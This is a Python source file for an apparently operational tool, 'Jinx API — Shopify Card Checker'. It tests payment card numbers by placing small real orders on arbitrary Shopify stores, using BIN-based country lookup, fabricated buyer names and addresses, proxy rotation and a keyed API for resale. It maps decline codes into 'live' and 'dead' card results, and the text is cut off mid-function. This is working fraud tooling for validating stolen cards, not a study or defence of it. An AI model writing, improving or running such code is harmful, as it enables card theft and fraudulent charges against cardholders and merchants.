#!/usr/bin/env python3
"""
Jinx API — Shopify Card Checker (v2.2 STABLE)
==============================================
Compatible with bot.py load balancer
Response format: {"Response": "...", "Price": "...", "Gateway": "..."}

Fixes in v2.2:
  - Syntax errors cleaned
  - Duplicate currency variable removed
  - set_card_country() called at start of checkout
  - Safe JSON parsing everywhere
  - Extended error code mapping (PAYMENTS_UNACCEPTABLE*)
  - Full try/except coverage
"""

import sys
import os
import re
import json
import time
import random
import threading
import secrets
import sqlite3
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

try:
    import requests
except ImportError:
    print("❌ pip install requests")
    sys.exit(1)

try:
    import socks  # noqa: F401
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False


# ============================================================
# BRAND
# ============================================================
BRAND = "Jinx"
VERSION = "2.2.0"
DB_PATH = "jinx_api_keys.db"


# ============================================================
# CONFIG
# ============================================================
PRICE_MIN = 0.50
PRICE_MAX = 15.00
MAX_RETRIES = 3
SOFT_ERRORS = {
    "WAITING_PENDING_TERMS",
    "TAX_NEW_TAX_MUST_BE_ACCEPTED",
    "PENDING_TERMS",
    "PROCESSING",
}


# ============================================================
# BIN → COUNTRY MAP
# ============================================================
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "MXN": "MX",
    "BRL": "BR", "EUR": "DE", "JPY": "JP", "AUD": "AU",
}

BOOK = {
    "US": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
           "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
           "state": "Maine", "currency": "USD"},
    "CA": {"address1": "88 Queen St W", "city": "Toronto", "postalCode": "M5H2M5",
           "zoneCode": "ON", "countryCode": "CA", "phone": "+14165551234",
           "state": "Ontario", "currency": "CAD"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW16XE",
           "zoneCode": "LND", "countryCode": "GB", "phone": "+442079460123",
           "state": "London", "currency": "GBP"},
    "IN": {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001",
           "zoneCode": "MH", "countryCode": "IN", "phone": "+919876543210",
           "state": "Maharashtra", "currency": "INR"},
    "AE": {"address1": "Burj Khalifa Tower", "city": "Dubai", "postalCode": "00000",
           "zoneCode": "DU", "countryCode": "AE", "phone": "+971501234567",
           "state": "Dubai", "currency": "AED"},
    "HK": {"address1": "Nathan Road 88", "city": "Kowloon", "postalCode": "999077",
           "zoneCode": "KL", "countryCode": "HK", "phone": "+85255555555",
           "state": "Kowloon", "currency": "HKD"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Zurich", "postalCode": "8002",
           "zoneCode": "ZH", "countryCode": "CH", "phone": "+4144512345",
           "state": "Zurich", "currency": "CHF"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000",
           "zoneCode": "NSW", "countryCode": "AU", "phone": "+61291234567",
           "state": "New South Wales", "currency": "AUD"},
    "MX": {"address1": "Av. Reforma 222", "city": "Ciudad de Mexico", "postalCode": "06600",
           "zoneCode": "CMX", "countryCode": "MX", "phone": "+525555555555",
           "state": "Ciudad de Mexico", "currency": "MXN"},
    "BR": {"address1": "Av. Paulista 1578", "city": "Sao Paulo", "postalCode": "01310200",
           "zoneCode": "SP", "countryCode": "BR", "phone": "+5511999999999",
           "state": "Sao Paulo", "currency": "BRL"},
    "DE": {"address1": "Friedrichstrasse 100", "city": "Berlin", "postalCode": "10117",
           "zoneCode": "BE", "countryCode": "DE", "phone": "+4930123456",
           "state": "Berlin", "currency": "EUR"},
    "JP": {"address1": "1-1 Chiyoda", "city": "Tokyo", "postalCode": "100-8111",
           "zoneCode": "TK", "countryCode": "JP", "phone": "+81312345678",
           "state": "Tokyo", "currency": "JPY"},
    "DEFAULT": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
                "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
                "state": "Maine", "currency": "USD"},
}


# ============================================================
# BIN LOOKUP
# ============================================================
_bin_cache = {}
_bin_lock = threading.Lock()


def lookup_bin_country(bin6):
    bin6 = str(bin6)[:6]
    if not bin6.isdigit():
        return "US"
    with _bin_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            country = (data.get("country_code") or
                       data.get("country_alpha2") or "US").upper()
            with _bin_lock:
                _bin_cache[bin6] = country
            return country
    except Exception:
        pass
    with _bin_lock:
        _bin_cache[bin6] = "US"
    return "US"


def pick_address(country_code):
    cc = (country_code or "US").upper()
    return BOOK.get(cc, BOOK["DEFAULT"])


# ============================================================
# PROXY PARSER
# ============================================================
SOCKS5_PORTS = {1080, 1081, 1082, 1083, 1084, 1085, 4145, 9050, 9150}
SOCKS4_PORTS = {4146}


def parse_proxy_string(p):
    if not p:
        return None
    p = p.strip()
    if not p or p.startswith("#"):
        return None

    hint = None
    m = re.search(r'\s*\(\s*([A-Za-z0-9]+)\s*\)\s*$', p)
    if m:
        hint = m.group(1).upper()
        p = p[:m.start()].strip()

    if p.startswith("socks5://") or p.startswith("socks5h://"):
        return ("socks5", p.replace("socks5h://", "socks5://"))
    if p.startswith("socks4://"):
        return ("socks4", p)
    if p.startswith("http://") or p.startswith("https://"):
        return ("http", p)

    if "@" in p:
        scheme = (hint or "http").lower()
        if scheme not in ("http", "socks4", "socks5"):
            scheme = "http"
        return (scheme, f"{scheme}://{p}")

    parts = p.split(":")
    if len(parts) == 4:
        ip, port_s, user, pw = parts
        try:
            port = int(port_s)
        except ValueError:
            return None
        if hint == "SOCKS5":
            scheme = "socks5"
        elif hint == "SOCKS4":
            scheme = "socks4"
        elif hint in ("HTTP", "HTTPS"):
            scheme = "http"
        elif port in SOCKS5_PORTS:
            scheme = "socks5"
        elif port in SOCKS4_PORTS:
            scheme = "socks4"
        else:
            scheme = "http"
        return (scheme, f"{scheme}://{user}:{pw}@{ip}:{port}")

    if len(parts) == 2:
        ip, port_s = parts
        try:
            port = int(port_s)
        except ValueError:
            return None
        if hint == "SOCKS5":
            scheme = "socks5"
        elif hint == "SOCKS4":
            scheme = "socks4"
        elif hint in ("HTTP", "HTTPS"):
            scheme = "http"
        elif port in SOCKS5_PORTS:
            scheme = "socks5"
        elif port in SOCKS4_PORTS:
            scheme = "socks4"
        else:
            scheme = "http"
        return (scheme, f"{scheme}://{ip}:{port}")

    return None


def build_proxies_dict(proxy_str):
    parsed = parse_proxy_string(proxy_str)
    if not parsed:
        return None, None
    scheme, url = parsed
    if scheme in ("socks4", "socks5") and not HAS_SOCKS:
        return None, "no_socks"
    return {"http": url, "https": url}, scheme


# ============================================================
# API KEY DB
# ============================================================
_db_lock = threading.Lock()


def _init_db():
    conn = sqlite3.connect(DB_PATH)
    try:
        conn.execute("""CREATE TABLE IF NOT EXISTS api_keys (
            key TEXT PRIMARY KEY,
            created_at INTEGER NOT NULL,
            expires_at INTEGER,
            label TEXT,
            active INTEGER DEFAULT 1,
            uses INTEGER DEFAULT 0,
            last_used INTEGER
        )""")
        conn.commit()
    finally:
        conn.close()


def _gen_key():
    return f"jx_{secrets.token_urlsafe(32)}"


def db_create_key(label=None, expires_in=None):
    key = _gen_key()
    now = int(time.time())
    exp = now + int(expires_in) if expires_in else None
    with _db_lock:
        conn = sqlite3.connect(DB_PATH)
        try:
            conn.execute("INSERT INTO api_keys VALUES (?, ?, ?, ?, 1, 0, NULL)",
                         (key, now, exp, label))
            conn.commit()
        finally:
            conn.close()
    return {"api_key": key, "created_at": now, "expires_at": exp, "label": label}


def db_validate_key(key):
    if not key:
        return False, "missing_key"
    with _db_lock:
        conn = sqlite3.connect(DB_PATH)
        try:
            cur = conn.execute("SELECT active, expires_at FROM api_keys WHERE key = ?", (key,))
            row = cur.fetchone()
            if not row:
                return False, "invalid_key"
            active, expires_at = row
            if not active:
                return False, "revoked_key"
            if expires_at and int(time.time()) > int(expires_at):
                return False, "expired_key"
            conn.execute("UPDATE api_keys SET uses = uses + 1, last_used = ? WHERE key = ?",
                         (int(time.time()), key))
            conn.commit()
            return True, "ok"
        finally:
            conn.close()


# ============================================================
# FAKER
# ============================================================
FIRST = ["James", "John", "Robert", "Michael", "William", "David",
         "Mary", "Patricia", "Jennifer", "Linda", "Ahmed", "Mohamed",
         "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah"]
LAST = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
        "Miller", "Davis", "Rodriguez", "Khalil", "Abdullah", "Alwan",
        "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Ahmed"]


class Faker:
    @staticmethod
    def first_name():
        return random.choice(FIRST)

    @staticmethod
    def last_name():
        return random.choice(LAST)


# ============================================================
# SHOPIFY CHECKER
# ============================================================
class Shopify:
    SOFT_ERRORS = SOFT_ERRORS

    def __init__(self, domain, proxy_dict=None, debug=False):
        self.domain = domain if domain.startswith("http") else f"https://{domain}"
        self.domain = self.domain.rstrip("/")
        self.session = requests.Session()
        self.proxy_dict = proxy_dict
        self.fake = Faker()
        self.user_agent = self._rand_ua()
        self.user_info = None
        self.product = None
        self.cart_token = None
        self.session_token = None
        self.queue_token = None
        self.stable_id = None
        self.payment_method_id = None
        self.payment_session_id = None
        self.debug = debug
        self.country_code = "US"
        self.address = BOOK["DEFAULT"]
        self._apply_proxy()

    def _rand_ua(self):
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        ])

    def _apply_proxy(self):
        if self.proxy_dict:
            self.session.proxies.update(self.proxy_dict)

    def _req(self, method, url, **kw):
        for attempt in range(2):
            try:
                return self.session.request(method, url, timeout=30, **kw)
            except Exception:
                if attempt == 0:
                    continue
                return None

    def _json(self, r):
        if not r:
            return None
        try:
            return r.json()
        except Exception:
            return None

    def _fb(self, text, start, end):
        if not text:
            return None
        try:
            s = text.index(start) + len(start)
            e = text.index(end, s)
            return text[s:e]
        except ValueError:
            return None

    def set_card_country(self, cc_number):
        self.country_code = lookup_bin_country(cc_number[:6])
        self.address = pick_address(self.country_code)

    def get_user_info(self):
        if self.user_info:
            return self.user_info
        fn = self.fake.first_name()
        ln = self.fake.last_name()
        email = f"{fn.lower()}.{ln.lower()}{random.randint(1, 999)}@gmail.com"
        self.user_info = {
            "fname": fn, "lname": ln, "email": email,
            "phone": self.address["phone"],
            "add": self.address["address1"],
            "city": self.address["city"],
            "state": self.address["state"],
            "state_short": self.address["zoneCode"],
            "zip": self.address["postalCode"],
        }
        return self.user_info

    def get_products(self):
        if self.product:
            return self.product

        r = self._req("GET", f"{self.domain}/products.json",
                      headers={"Accept": "application/json"})
        if not r:
            return None
        data = self._json(r)
        if not data:
            return None
        products = data.get("products", [])
        if not products:
            return None

        blacklist = ["sample", "free", "gift", "test", "donation", "tip"]
        valid = []

        for p in products:
            title = (p.get("title") or "").lower()
            if any(w in title for w in blacklist):
                continue
            variants = p.get("variants", [])
            if not variants:
                continue
            for v in variants:
                if not v.get("available", True):
                    continue
                try:
                    price = float(str(v.get("price", 999)).replace(",", ""))
                except Exception:
                    continue
                if PRICE_MIN <= price <= PRICE_MAX:
                    valid.append({
                        "title": p["title"],
                        "handle": p["handle"],
                        "variant_id": v["id"],
                        "price": price,
                    })

        if not valid:
            return None

        # Mid-range selection to avoid site minimum-order errors
        valid.sort(key=lambda x: x["price"])
        mid = min(len(valid) // 2, len(valid) - 1)
        self.product = valid[mid]
        return self.product

    def visit_product_page(self):
        p = self.get_products()
        if not p:
            return False
        r = self._req("GET", f"{self.domain}/products/{p['handle']}",
                      headers={"Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                               "Referer": f"{self.domain}/"})
        return bool(r)

    def add_to_cart(self):
        p = self.get_products()
        if not p:
            return None
        headers = {"Accept": "application/json",
                   "Content-Type": "application/x-www-form-urlencoded",
                   "Referer": f"{self.domain}/"}
        self._req("GET", f"{self.domain}/cart.js", headers=headers)
        r = self._req("POST", f"{self.domain}/cart/add.js", headers=headers,
                      data={"id": str(p["variant_id"]), "quantity": "1",
                            "form_type": "product"})
        if not r or r.status_code != 200:
            headers2 = {**headers, "Content-Type": "application/json"}
            r = self._req("POST", f"{self.domain}/cart/add.js", headers=headers2,
                          json={"items": [{"id": int(p["variant_id"]), "quantity": 1}]})
        if not r or r.status_code != 200:
            return None
        cr = self._req("GET", f"{self.domain}/cart.js", headers=headers)
        if not cr:
            return None
        cd = self._json(cr)
        if not cd:
            return None
        self.cart_token = cd.get("token")
        return self.cart_token

    def init_checkout(self):
        headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Content-Type": "application/x-www-form-urlencoded",
                   "Origin": self.domain, "Referer": f"{self.domain}/cart",
                   "Upgrade-Insecure-Requests": "1"}
        self._req("GET", f"{self.domain}/checkout", headers=headers)
        r = self._req("POST", f"{self.domain}/cart", headers=headers,
                      data={"checkout": "", "updates[]": "1"},
                      allow_redirects=True)
        if not r:
            return False

        text = r.text or ""
        for pat, grp in [
            (r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', 1),
            (r'"serializedSessionToken":"([^"]+)"', 1),
            (r'"sessionToken":"([^"]+)"', 1),
        ]:
            m = re.search(pat, text)
            if m:
                self.session_token = m.group(grp)
                break

        self.queue_token = self._fb(text, "queueToken&quot;:&quot;", "&quot;")
        self.stable_id = self._fb(text, "stableId&quot;:&quot;", "&quot;")
        self.payment_method_id = self._fb(
            text, "paymentMethodIdentifier&quot;:&quot;", "&quot;"
        )

        return all([self.session_token, self.queue_token, self.stable_id,
                    self.payment_method_id])

    def create_payment_session(self, cc, mon, year, cvv):
        ui = self.get_user_info()
        if len(str(year)) == 2:
            year = "20" + str(year)

        endpoints = [
            "https://deposit.us.shopifycs.com/sessions",
            "https://checkout.pci.shopifyinc.com/sessions",
            "https://checkout.shopifycs.com/sessions",
        ]
        for ep in endpoints:
            try:
                headers = {"Authority": urlparse(ep).netloc,
                           "Accept": "application/json",
                           "Content-Type": "application/json",
                           "Origin": "https://checkout.shopifycs.com",
                           "Referer": "https://checkout.shopifycs.com/",
                           "User-Agent": self.user_agent}
                data = {"credit_card": {
                            "number": str(cc).replace(" ", ""),
                            "month": int(mon),
                            "year": int(year),
                            "verification_value": str(cvv),
                            "name": f"{ui['fname']} {ui['lname']}"
                        },
                        "payment_session_scope": urlparse(self.domain).netloc}
                r = self.session.post(ep, headers=headers, json=data, timeout=30)
                if r.status_code == 200:
                    j = self._json(r)
                    if j and "id" in j:
                        self.payment_session_id = j["id"]
                        return self.payment_session_id
            except Exception:
                continue
        return None

    def _build_payload(self):
        ui = self.get_user_info()
        p = self.get_products()
        if not p:
            return None
        vid = p["variant_id"]
        price = p["price"]
        currency = self.address.get("currency", "USD")
        country = self.address["countryCode"]

        addr = {
            "address1": ui["add"], "address2": "", "city": ui["city"],
            "countryCode": country, "postalCode": ui["zip"], "company": "",
            "firstName": ui["fname"], "lastName": ui["lname"],
            "zoneCode": ui["state_short"], "phone": ui["phone"]
        }

        total_amount = {"value": {"amount": str(price), "currencyCode": currency}}

        return {
            "query": (
                "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
                "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
                "$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken "
                "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){"
                "...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}"
                "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}"
                "...on SubmitFailed{reason __typename}"
                "...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}"
                "...on Throttled{pollAfter pollUrl queueToken __typename}"
                "...on CheckpointDenied{redirectUrl __typename}"
                "...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}"
                "fragment ReceiptDetails on Receipt{"
                "...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
                "...on ProcessingReceipt{id pollDelay __typename}"
                "...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
                "...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"
            ),
            "variables": {
                "input": {
                    "checkpointData": None,
                    "sessionInput": {"sessionToken": self.session_token},
                    "queueToken": self.queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True}
                                },
                                "options": {}
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id}]},
                            "destination": {"streetAddress": addr},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": total_amount,
                            "destinationChanged": True
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": self.stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                                    "variantId": f"gid://shopify/ProductVariant/{vid}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": total_amount,
                            "lineComponentsSource": None,
                            "lineComponents": []
                        }]
                    },
                    "payment": {
                        "totalAmount": total_amount,
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": self.payment_method_id,
                                    "sessionId": self.payment_session_id,
                                    "billingAddress": {"streetAddress": addr},
                                    "cardSource": None
                                }
                            },
                            "amount": total_amount,
                            "dueAt": None
                        }],
                        "billingAddress": {"streetAddress": addr}
                    },
                    "buyerIdentity": {
                        "buyerIdentity": {
                            "presentmentCurrency": currency,
                            "countryCode": country
                        },
                        "contactInfoV2": {
                            "emailOrSms": {"value": ui["email"], "emailOrSmsChanged": False}
                        },
                        "marketingConsent": [{"email": {"value": ui["email"]}}],
                        "shopPayOptInPhone": {"countryCode": country}
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": []
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": []
                    },
                    "optionalDuties": {"buyerRefusesDuties": False}
                },
                "attemptToken": f"{self.cart_token}-{random.random()}",
                "metafields": [],
                "analytics": {"requestUrl": f"{self.domain}/checkouts/cn/{self.cart_token}"}
            },
            "operationName": "SubmitForCompletion"
        }

    def _gql_headers(self):
        return {
            "Authority": urlparse(self.domain).netloc,
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": self.domain,
            "Referer": f"{self.domain}/",
            "User-Agent": self.user_agent,
            "X-Checkout-One-Session-Token": self.session_token,
            "X-Checkout-Web-Deploy-Stage": "production",
            "X-Checkout-Web-Server-Handling": "fast",
            "X-Checkout-Web-Source-Id": self.cart_token
        }

    def submit_payment(self):
        if not all([self.session_token, self.payment_session_id, self.cart_token]):
            return {"status": "failed", "reason": "missing_tokens"}

        gql_headers = self._gql_headers()

        for attempt in range(MAX_RETRIES):
            payload = self._build_payload()
            if not payload:
                return {"status": "failed", "reason": "no_product"}
            try:
                r = self.session.post(
                    f"{self.domain}/checkouts/unstable/graphql",
                    headers=gql_headers, json=payload, timeout=30
                )
                if r.status_code != 200:
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(2)
                        continue
                    return {"status": "failed", "reason": f"http_{r.status_code}"}

                result = self._json(r)
                if not result:
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(2)
                        continue
                    return {"status": "failed", "reason": "invalid_json_submit"}

                completion = result.get("data", {}).get("submitForCompletion", {})
                if not completion:
                    errors = result.get("errors", [])
                    for e in errors:
                        if e.get("code"):
                            return {"status": "rejected", "errors": [e["code"]]}
                    return {"status": "failed", "reason": "empty_submit"}

                # Rejected errors
                if completion.get("errors"):
                    codes = [e.get("code") for e in completion["errors"] if "code" in e]
                    msgs = [e.get("localizedMessage", "") for e in completion["errors"]]
                    non_soft = [c for c in codes if c not in self.SOFT_ERRORS]
                    if not non_soft and attempt < MAX_RETRIES - 1:
                        time.sleep(3)
                        continue
                    if non_soft:
                        return {"status": "rejected", "errors": non_soft,
                                "messages": msgs}

                tn = completion.get("__typename")
                if tn == "Throttled":
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(3)
                        continue
                    return {"status": "failed", "reason": "throttled"}

                if completion.get("reason"):
                    return {"status": "failed", "reason": completion["reason"]}

                if completion.get("receipt"):
                    rid = completion["receipt"].get("id")
                    if rid:
                        return self._poll_receipt(rid, gql_headers)

                break
            except Exception as e:
                if attempt < MAX_RETRIES - 1:
                    time.sleep(2)
                    continue
                return {"status": "failed", "reason": f"submit_exception: {str(e)[:80]}"}
        return {"status": "failed", "reason": "unknown_submit"}

    def _poll_receipt(self, rid, headers):
        poll_q = (
            "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
            "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
            "...ReceiptDetails __typename}}"
            "fragment ReceiptDetails on Receipt{"
            "...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
            "...on ProcessingReceipt{id pollDelay __typename}"
            "...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
            "...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"
        )
        for _ in range(10):
            try:
                r = self.session.post(
                    f"{self.domain}/checkouts/unstable/graphql",
                    headers=headers,
                    json={"query": poll_q,
                          "variables": {"receiptId": rid, "sessionToken": self.session_token},
                          "operationName": "PollForReceipt"},
                    timeout=30
                )
                if r.status_code != 200:
                    time.sleep(3)
                    continue
                data = self._json(r)
                if not data:
                    time.sleep(3)
                    continue
                receipt = data.get("data", {}).get("receipt", {})
                tn = receipt.get("__typename")

                if tn == "ProcessedReceipt" or "orderIdentity" in receipt:
                    oid = receipt.get("orderIdentity", {}).get("id", "N/A")
                    return {"status": "charged", "order_id": oid}

                if tn in ("ProcessingReceipt", "WaitingReceipt"):
                    delay = receipt.get("pollDelay", 3)
                    try:
                        delay = min(max(int(delay), 2), 10)
                    except Exception:
                        delay = 3
                    time.sleep(delay)
                    continue

                if tn == "ActionRequiredReceipt":
                    return {"status": "3ds_required", "data": data}

                if tn == "FailedReceipt":
                    pe = receipt.get("processingError", {})
                    return {"status": "declined",
                            "code": pe.get("code", "CARD_DECLINED"),
                            "message": pe.get("messageUntranslated", "")}
                time.sleep(3)
            except Exception:
                time.sleep(3)
                continue
        return {"status": "failed", "reason": "poll_timeout"}

    def checkout(self, cc, mon, year, cvv):
        try:
            # Set country from BIN FIRST (before any requests)
            self.set_card_country(cc)

            if not self.visit_product_page():
                return {"status": "failed", "step": 1, "reason": "product_page_failed"}
            if not self.add_to_cart():
                return {"status": "failed", "step": 2, "reason": "cart_failed"}
            if not self.init_checkout():
                return {"status": "failed", "step": 3, "reason": "checkout_init_failed"}

            time.sleep(1)
            if not self.create_payment_session(cc, mon, year, cvv):
                return {"status": "failed", "step": 4, "reason": "payment_session_failed"}

            time.sleep(1)
            return self.submit_payment()
        except Exception as e:
            return {"status": "failed", "reason": f"checkout_exception: {str(e)[:80]}"}
        finally:
            self.reset()

    def reset(self):
        self.cart_token = None
        self.session_token = None
        self.queue_token = None
        self.stable_id = None
        self.payment_method_id = None
        self.payment_session_id = None


# ============================================================
# ERROR CODE MAPPER
# ============================================================
CODE_MAP = {
    # Shopify → clean names
    "PAYMENTS_UNACCEPTABLE": "PAYMENTS_UNACCEPTABLE",
    "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT": "PAYMENT_AMOUNT_INVALID",
    "PAYMENTS_UNACCEPTABLE_PAYMENT_METHOD": "PAYMENT_METHOD_REJECTED",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED": "EXPIRED_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_CVV_FAILED": "INVALID_CVV",
    "PAYMENTS_CREDIT_CARD_BASE_INCORRECT_NUMBER": "INCORRECT_NUMBER",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_NUMBER": "INVALID_NUMBER",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVV": "INVALID_CVV",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_EXPIRY": "INVALID_EXPIRY",
    "PAYMENTS_CREDIT_CARD_BASE_DECLINED": "CARD_DECLINED",
    "PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE": "GENERIC_DECLINE",
    "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
    "PAYMENTS_CREDIT_CARD_BASE_CALL_ISSUER": "CALL_ISSUER",
    "PAYMENTS_CREDIT_CARD_BASE_DO_NOT_HONOR": "DO_NOT_HONOR",
    "PAYMENTS_CREDIT_CARD_BASE_PICKUP_CARD": "PICKUP_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_RESTRICTED_CARD": "RESTRICTED_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_SECURITY_VIOLATION": "SECURITY_VIOLATION",
    "PAYMENTS_CREDIT_CARD_BASE_SERVICE_NOT_ALLOWED": "SERVICE_NOT_ALLOWED",
    "PAYMENTS_CREDIT_CARD_BASE_STOLEN_CARD": "STOLEN_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_TRANSACTION_NOT_ALLOWED": "TRANSACTION_NOT_ALLOWED",
    "PAYMENTS_CREDIT_CARD_BASE_TRY_AGAIN_LATER": "TRY_AGAIN_LATER",
    "PAYMENTS_CREDIT_CARD_BASE_PROCESSING_ERROR": "PROCESSING_ERROR",
    "PAYMENT_FAILED": "CARD_DECLINED",
    "GENERIC_ERROR": "GENERIC_DECLINE",
    "CARD_DECLINED": "CARD_DECLINED",
    "INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
    "INCORRECT_CVC": "INVALID_CVV",
    "INCORRECT_ZIP": "INVALID_ZIP",
    "INCORRECT_NUMBER": "INCORRECT_NUMBER",
    "EXPIRED_CARD": "EXPIRED_CARD",
    "DO_NOT_HONOR": "DO_NOT_HONOR",
}


def map_code(raw):
    if not raw:
        return "UNKNOWN"
    return CODE_MAP.get(raw, raw)


def extract_code(text):
    """Extract a clean code from arbitrary response text."""
    if not text:
        return "UNKNOWN"
    text_str = str(text)
    # Try known patterns
    for pattern in [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+)',
    ]:
        for m in re.findall(pattern, text_str, re.IGNORECASE):
            if isinstance(m, tuple):
                m = m[0]
            if m and "_" in m and len(m) < 60:
                return m.strip("{}:'\" ")
    # Fallback: first uppercase word
    for w in text_str.split():
        if w.isupper() and len(w) > 3 and "_" in w:
            return w.strip("{}:'\" ")
    return text_str.strip()[:60] or "UNKNOWN"


# ============================================================
# PARSER
# ============================================================
def parse_result(r):
    if not r:
        return "UNKNOWN", "Unknown", False
    st = r.get("status", "unknown")

    if st == "charged":
        return "ORDER_PLACED", "Order Placed 🔥", True

    if st == "3ds_required":
        return "OTP_REQUIRED", "OTP / 3DS Required", False

    if st == "declined":
        raw_code = r.get("code", "CARD_DECLINED")
        code = map_code(raw_code)
        msg = r.get("message", "")
        label = code + (f" – {msg}" if msg else "")
        return code, label, False

    if st == "rejected":
        errors = r.get("errors", [])
        mapped = [map_code(e) for e in errors]
        clean = [e for e in mapped if e and e != "UNKNOWN"]
        if not clean:
            clean = errors or ["REJECTED"]
        return ",".join(clean), ", ".join(clean), False

    if st == "failed":
        reason = r.get("reason", "Failed")
        return extract_code(reason), reason, False

    return st.upper(), st.title(), False


# ============================================================
# RUN CHECK — bot.py-compatible format
# ============================================================
def run_check(site, cc, proxy=None):
    parts = cc.split("|")
    if len(parts) != 4:
        return {"Response": "INVALID_FORMAT", "Price": "-", "Gateway": "Unknown"}

    proxy_dict = None
    proxy_scheme = None
    if proxy:
        proxy_dict, proxy_scheme = build_proxies_dict(proxy)
        if proxy_dict is None:
            if proxy_scheme == "no_socks":
                return {"Response": "NO_SOCKS_SUPPORT", "Price": "-", "Gateway": "Unknown"}
            return {"Response": "INVALID_PROXY", "Price": "-", "Gateway": "Unknown"}

    bot = None
    try:
        bot = Shopify(site, proxy_dict, debug=False)
        r = bot.checkout(parts[0], parts[1], parts[2], parts[3])
    except Exception as e:
        return {
            "Response": f"EXCEPTION: {str(e)[:60]}",
